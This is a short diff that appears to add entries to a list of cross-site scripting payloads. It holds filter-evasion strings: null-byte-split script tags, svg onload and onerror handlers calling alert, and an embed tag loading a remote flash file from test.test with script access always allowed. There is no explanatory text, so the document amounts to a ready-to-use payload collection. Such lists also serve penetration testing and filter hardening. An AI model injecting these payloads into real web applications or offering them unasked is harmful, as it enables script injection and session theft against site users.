@@ -9,3 +9,8 @@ a=8,b=confirm,c=window,c.onerror=b;throw-a
 \'-alert(6)//
 </script><svg onload=alert(6)>
 <svg+onload=alert%26%230000000040"")>&#=%26%230000000040=(
+;<sc%00ript>alert/**/(1)</script>
+alert/**/(1)//
+;<sc%00ript/test='asdf'>alert/**/(1)</script>
+;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
+;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//test.test/xss2.swf'//>&id=9978655
